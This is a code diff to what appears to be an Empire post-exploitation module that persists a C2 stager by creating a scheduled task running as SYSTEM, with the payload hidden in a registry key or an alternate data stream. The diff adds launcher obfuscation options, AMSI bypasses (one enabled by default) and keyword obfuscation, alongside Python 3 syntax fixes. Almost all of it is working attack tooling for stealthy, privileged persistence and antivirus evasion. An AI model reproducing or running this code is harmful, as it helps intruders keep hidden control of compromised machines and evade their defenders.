@@ -1,7 +1,12 @@
+from __future__ import print_function
+
 import os
+from builtins import object
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -11,6 +16,10 @@ class Module:
             'Author': ['@mattifestation', '@harmj0y'],
 
             'Description': ('Persist a stager (or script) using schtasks running as SYSTEM. This has a moderate detection/removal rating.'),
+
+            'Software': 'S0111',
+
+            'Techniques': ['T1053'],
 
             'Background' : False,
 
@@ -43,6 +52,26 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'DailyTime' : {
                 'Description'   :   'Daily time to trigger the script (HH:mm).',
                 'Required'      :   False,
@@ -66,7 +95,7 @@ class Module:
             'RegPath' : {
                 'Description'   :   'Registry location to store the script code. Last element is the key name.',
                 'Required'      :   False,
-                'Value'         :   'HKLM:\Software\Microsoft\Network\debug'
+                'Value'         :   r'HKLM:\Software\Microsoft\Network\debug'
             },
             'ADSPath' : {
                 'Description'   :   'Alternate-data-stream location to store the script code.',
@@ -112,7 +141,12 @@ class Module:
 
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        
+
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
+
         listenerName = self.options['Listener']['Value']
         
         # trigger options
@@ -133,6 +167,13 @@ class Module:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        if (self.options['Obfuscate']['Value']).lower() == 'true':
+            Obfuscate = True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
 
         statusMsg = ""
         locationString = ""
@@ -143,7 +184,7 @@ class Module:
             if adsPath != '':
                 # remove the ADS storage location
                 if ".txt" not in adsPath:
-                    print helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
+                    print(helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"))
                     return ""
 
                 script = "Invoke-Command -ScriptBlock {cmd /C \"echo x > "+adsPath+"\"};"
@@ -160,8 +201,9 @@ class Module:
 
             script += "schtasks /Delete /F /TN "+taskName+";"
             script += "'Schtasks persistence removed.'"
-            if obfuscate:
-                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+        if obfuscate:
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
             return script
 
         if extFile != '':
@@ -177,19 +219,19 @@ class Module:
                 statusMsg += "using external file " + extFile
 
             else:
-                print helpers.color("[!] File does not exist: " + extFile)
+                print(helpers.color("[!] File does not exist: " + extFile))
                 return ""
 
         else:
             # if an external file isn't specified, use a listener
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
                 # not a valid listener, return nothing for the script
-                print helpers.color("[!] Invalid listener: " + listenerName)
+                print(helpers.color("[!] Invalid listener: " + listenerName))
                 return ""
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
                 
                 encScript = launcher.split(" ")[-1]
                 statusMsg += "using listener " + listenerName
@@ -198,7 +240,7 @@ class Module:
         if adsPath != '':
             # store the script in the specified alternate data stream location
             if ".txt" not in adsPath:
-                    print helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
+                    print(helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"))
                     return ""
             
             script = "Invoke-Command -ScriptBlock {cmd /C \"echo "+encScript+" > "+adsPath+"\"};"
@@ -225,7 +267,7 @@ class Module:
         
         # sanity check to make sure we haven't exceeded the cmd.exe command length max
         if len(triggerCmd) > 259:
-            print helpers.color("[!] Warning: trigger command exceeds the maximum of 259 characters.")
+            print(helpers.color("[!] Warning: trigger command exceeds the maximum of 259 characters."))
             return ""
 
         if onLogon != '':
@@ -236,10 +278,12 @@ class Module:
             statusMsg += " with "+taskName+" idle trigger on " + idleTime + "."
         else:
             # otherwise assume we're doing a daily trigger
-	    
             script += "schtasks /Create /F /RU system /SC DAILY /ST "+dailyTime+" /TN "+taskName+" /TR "+triggerCmd+";"
             statusMsg += " with "+taskName+" daily trigger at " + dailyTime + "."
         script += "'Schtasks persistence established "+statusMsg+"'"
+
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
         return script
